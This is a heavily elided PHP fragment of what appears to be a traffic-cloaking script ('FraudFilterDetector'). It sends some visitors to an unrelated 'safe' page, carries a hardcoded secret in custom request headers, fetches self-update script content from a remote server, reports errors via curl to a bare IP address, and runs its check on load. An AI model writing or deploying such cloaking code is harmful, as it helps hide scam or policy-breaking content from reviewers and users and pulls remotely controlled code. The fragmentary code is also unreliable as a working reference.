...
class FraudFilterDetector_rln7u {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'e6dff23f-5a16-433d-828f-bfa61b07c760.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://brill.com/view/title/56966?rskey=UdnIyw&result=2');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: e6dff23f-5a16-433d-828f-bfa61b07c760',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: e6dff23f-5a16-433d-828f-bfa61b07c760';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: e6dff23f-5a16-433d-828f-bfa61b07c760';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=rln7u&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_rln7u = new FraudFilterDetector_rln7u();
$fraudFilterDetector_rln7u->check();
